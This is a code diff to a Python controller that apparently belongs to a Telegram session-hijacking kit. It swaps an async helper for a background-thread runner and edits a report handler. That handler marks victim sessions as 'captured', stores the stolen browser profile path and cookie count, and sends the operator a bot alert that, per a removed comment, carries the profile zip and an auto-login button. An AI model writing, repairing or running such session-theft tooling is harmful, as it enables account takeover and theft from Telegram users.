@@ -38,20 +38,17 @@ def save_sessions(sessions):
         json.dump(sessions, f, indent=2)
 
 
-def run_async(coro):
-    """Run async function in background"""
+def run_in_thread(func, *args):
+    """Run function in background thread"""
     def _run():
         try:
-            asyncio.run(coro)
+            func(*args)
         except Exception as e:
-            print(f"[Async Error] {e}", flush=True)
+            print(f"[Thread Error] {e}", flush=True)
             import traceback
             traceback.print_exc()
     thread = threading.Thread(target=_run, daemon=True)
     thread.start()
-    # Give it a moment to start
-    import time
-    time.sleep(0.1)
 
 
 # Dashboard HTML template
@@ -248,22 +245,20 @@ def report():
     session = sessions[session_id]
     session["last_activity"] = timestamp
     
-    # Handle Telegram session capture - ONLY alert type
+    # Handle Telegram session capture
     if report_type == "telegram_session":
         profile_path = report_data.get("profile_path", "")
-        print(f"[Controller] Telegram session received: {session_id}", flush=True)
-        print(f"[Controller] Profile path: {profile_path}", flush=True)
+        print(f"[Controller] Telegram session: {session_id}", flush=True)
+        print(f"[Controller] Profile: {profile_path}", flush=True)
         
         session["status"] = "captured"
         session["profile_path"] = profile_path
         session["cookie_count"] = report_data.get("cookie_count", 0)
         
-        # Send ONE alert with profile zip and auto-login button
+        # Send alert in background thread
         if profile_path:
-            print(f"[Controller] Sending Telegram alert...", flush=True)
-            run_async(bot.on_telegram_captured(session_id, profile_path))
-        else:
-            print(f"[Controller] No profile path!", flush=True)
+            print(f"[Controller] Sending alert...", flush=True)
+            run_in_thread(bot.alert_telegram_session, session_id, profile_path)
     
     save_sessions(sessions)
     
